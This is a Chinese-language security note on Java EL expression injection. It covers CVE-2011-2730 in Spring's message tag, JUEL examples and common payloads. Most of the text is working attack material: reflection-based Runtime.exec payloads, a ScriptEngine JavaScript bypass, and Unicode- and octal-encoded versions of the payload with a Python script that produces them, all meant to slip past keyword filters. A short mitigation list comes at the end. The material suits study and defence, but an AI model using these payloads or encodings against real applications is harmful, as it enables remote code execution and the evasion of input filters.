EL表达式注入漏洞和 SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。

一般的，EL表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的EL表达式内容全部或部分是从外部获取的。

# 通用Poc 
```java
//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

//文件头参数
${header}

//获取webRoot
${applicationScope}

//执行命令
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}
```
一些例子：
#  CVE-2011-2730


参考链接：[Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730）](https://juejin.cn/post/6844903572077838350)
Poc如下
```java
<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}"></spring:message>
```
正常情况下为：
```java
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<spring:message  text="${param.a}"></spring:message>
```

可以看到他从请求参数中获取a字段放到EL解析
这样当访问
```
http://localhost/test.jsp?a=${applicationScope}
```


`${applicationScope}` 这段字符串会被当做 el表达式被执行，而不是作为字符串直接显示在页面上，我们改变提交的 el表达式，就可以获取我们需要的信息了，这就达到了 el表达式注入的效果。


[搜狗某系统存在远程EL表达式注入漏洞(命令执行)](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0195845)

[工商银行某系统存在远程EL表达式注入漏洞(命令执行)](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0196160)


# JUEL示例

下面我们直接看下在 Java 代码中 EL表达式注入的场景是怎么样的。

EL 曾经是 `JSTL` 的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包 `javax.el` 中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用！

也就是说，现在 EL 表达式所依赖的包 `javax.el` 等都在 `JUEL` 相关的 jar 包中。

JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。

更多参考官网：[http://juel.sourceforge.net/](http://juel.sourceforge.net/)

需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。
```xml
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-api</artifactId>
    <version>2.2.7</version>
</dependency>
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-spi</artifactId>
    <version>2.2.7</version>
</dependency>
<dependency>
    <groupId>de.odysseus.juel</groupId>
    <artifactId>juel-impl</artifactId>
    <version>2.2.7</version>
</dependency>
```

我们来写一个简单利用反射调用 Runtime 类方法实现命令执行的代码


```java
package Demo;  
  
import de.odysseus.el.ExpressionFactoryImpl;  
import de.odysseus.el.util.SimpleContext;  
  
import javax.el.ExpressionFactory;  
import javax.el.ValueExpression;  
public class juelExec {  
    public static void main(String[] args) {  
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  
        SimpleContext simpleContext = new SimpleContext();  
        // failed  
        //String exp = "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}";        
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  
        System.out.println(valueExpression.getValue(simpleContext));  
    }  
}
```


# EL表达式的EXP和基础绕过
基础exp
```
"${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}"
```
## 利用 ScriptEngine 调用 JS 引擎绕过

同 SpEL 注入中讲到的

**ScriptEngineExec.java**

```java  
import de.odysseus.el.ExpressionFactoryImpl;  
import de.odysseus.el.util.SimpleContext;  
  
import javax.el.ExpressionFactory;  
import javax.el.ValueExpression;  
  
public class ScriptEngineExec {  
    public static void main(String[] args) {  
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  
        SimpleContext simpleContext = new SimpleContext();  
        // failed  
 // String exp = "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}"; // ok 
		 String exp ="${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('Calc.exe')\")}\n" +  
                " ";  
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  
        System.out.println(valueExpression.getValue(simpleContext));  
    }  
}
```
可以看到这里
先使用反射加载脚本管理器
`''.getClass().forName("javax.script.ScriptEngineManager").newInstance()`
获取JavaScript引擎
``.getEngineByName("JavaScript")``
然后执行js代码字符串
`.eval("java.lang.Runtime.getRuntime().exec('Calc.exe')")`

可以看到这里的命令执行在字符串中，并不在EL语法中，并且也没有method的直接invoke，可能会绕过一些关键字的检查

##  利用编码绕过

对可利用的 PoC 进行全部或部分的 Unicode 编码都是 OK 的：
```
${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}
// Unicode编码内容为前面反射调用的PoC
\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d
```
同理
```
// 八进制编码内容为前面反射调用的PoC
\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175
```

占一个快速转换的脚本 
```python
str = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}"
result = ""
for s in str:
  num = "\\" + oct(ord(s))
  result += num
print(result.replace("\\0", "\\"))

```
- 尽量不使用外部输入的内容作为 EL 表达式内容；
- 若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；
- 如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：
```java
javax.el.ExpressionFactory.createValueExpression()
javax.el.ValueExpression.getValue()
```
























